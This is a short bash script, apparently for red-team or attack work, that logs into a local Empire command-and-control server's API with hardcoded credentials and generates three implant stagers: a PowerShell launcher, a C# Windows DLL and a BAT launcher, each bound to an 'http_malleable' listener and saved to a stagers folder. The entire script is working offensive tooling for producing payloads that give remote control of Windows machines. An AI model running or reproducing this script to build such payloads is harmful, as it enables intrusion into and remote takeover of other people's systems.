#!/bin/bash

# Get token
TOKEN=$(curl -s -X POST http://127.0.0.1:1337/token -d "username=empireadmin&password=password123" | jq -r '.access_token')

echo "🚀 Generating Empire stagers..."
echo ""

# 1. PowerShell
curl -s -X POST http://127.0.0.1:1337/api/v2/stagers \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"ps_final","template":"multi_launcher","options":{"Listener":"http_malleable","Language":"powershell"}}' > /tmp/ps.json

LINK=$(jq -r '.downloads[0].link' /tmp/ps.json)
curl -s http://127.0.0.1:1337$LINK -H "Authorization: Bearer $TOKEN" > stagers/empire_ps_stager.ps1
echo "[1/3] ✓ PowerShell: $(wc -c < stagers/empire_ps_stager.ps1) bytes"

# 2. DLL
curl -s -X POST http://127.0.0.1:1337/api/v2/stagers \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"dll_final","template":"windows_dll","options":{"Listener":"http_malleable","Language":"csharp"}}' > /tmp/dll.json

LINK=$(jq -r '.downloads[0].link' /tmp/dll.json)
curl -s http://127.0.0.1:1337$LINK -H "Authorization: Bearer $TOKEN" | base64 -d > stagers/empire_dll.dll
echo "[2/3] ✓ DLL: $(wc -c < stagers/empire_dll.dll) bytes"

# 3. BAT
curl -s -X POST http://127.0.0.1:1337/api/v2/stagers \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"bat_final","template":"windows_launcher_bat","options":{"Listener":"http_malleable"}}' > /tmp/bat.json

LINK=$(jq -r '.downloads[0].link' /tmp/bat.json)
curl -s http://127.0.0.1:1337$LINK -H "Authorization: Bearer $TOKEN" > stagers/empire_launcher.bat
echo "[3/3] ✓ BAT: $(wc -c < stagers/empire_launcher.bat) bytes"

echo ""
echo "✅ Done! Files in stagers/:"
ls -lh stagers/
